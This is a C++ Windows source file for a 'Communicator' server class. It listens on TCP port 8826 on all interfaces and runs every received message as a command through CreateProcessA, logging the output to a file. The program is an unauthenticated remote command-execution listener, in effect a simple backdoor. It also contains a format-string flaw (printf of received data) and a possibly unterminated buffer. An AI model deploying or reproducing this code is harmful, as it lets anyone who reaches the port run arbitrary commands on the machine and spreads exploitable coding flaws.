
#include "Communicator.h"
#include <exception>
#include <iostream>
#include <string>
#include <numeric>
#include <ctime>


// using static const instead of macros 
static const unsigned short PORT = 8826;
static const unsigned int IFACE = 0;

using std::string;
using std::mutex;
using std::unique_lock;
using std::vector;


Communicator::Communicator()
{
	// notice that we step out to the global namespace
	// for the resolution of the function socket
	_m_serverSocket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (_m_serverSocket == INVALID_SOCKET)
		throw std::exception(__FUNCTION__ " - socket");

	//restart factory
}

Communicator::~Communicator()
{
	printf(__FUNCTION__ " closing accepting socket");
	// why is this try necessarily ?
	try
	{
		// the only use of the destructor should be for freeing 
		// resources that was allocated in the constructor
		::closesocket(_m_serverSocket);
	}
	catch (...) {}
}

void Communicator::serve()
{
	bindAndListen();


	while (true)
	{
		// the main thread is only accepting clients 
		// and add then to the list of handlers
		printf("accepting client...");
		startHandleRequests();
	}
}


// listen to connecting requests from clients
// accept them, and create thread for each client
void Communicator::bindAndListen()
{
	struct sockaddr_in sa = { 0 };
	sa.sin_port = htons(PORT);
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = IFACE;
	// again stepping out to the global namespace
	if (::bind(_m_serverSocket, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR)
		throw std::exception(__FUNCTION__ " - bind");
	printf("binded");
	if (::listen(_m_serverSocket, SOMAXCONN) == SOCKET_ERROR)
		throw std::exception(__FUNCTION__ " - listen");
	printf("listening...");
}

void Communicator::startHandleRequests()
{
	printf("start hendle client\n");
	SOCKET client_socket = accept(_m_serverSocket, NULL, NULL);
	if (client_socket == INVALID_SOCKET)
		throw std::exception(__FUNCTION__);

	printf("Client accepted !\n");


	//create new thread for client	and detach from it
	Communicator::handleNewClient(client_socket);
	//tr.detach();
}


void Communicator::handleNewClient(const SOCKET client_socket)
{



	while (true)
	{
		SECURITY_ATTRIBUTES sa;
		sa.nLength = sizeof(sa);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		char buffer[100] = { 0 };
		int resRez = recv(client_socket, buffer, 100, 0);
		if (resRez <=0)
		{
			printf("cennot recive message");
			Sleep(10);
		}
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		si.dwFlags = STARTF_USESTDHANDLES;
		HANDLE outputDir =CreateFileA(
			"dirdir.txt",
			FILE_APPEND_DATA,
			FILE_SHARE_WRITE | FILE_SHARE_READ,
			&sa,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		si.hStdOutput = outputDir;
		si.cb = sizeof(STARTUPINFO);
		si.dwFlags |= STARTF_USESTDHANDLES;
		si.hStdInput = NULL;
		si.hStdError = outputDir;
		
		
		BOOL i = CreateProcessA(NULL, buffer, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

        printf(buffer);
		
	}

	closesocket(client_socket);
}



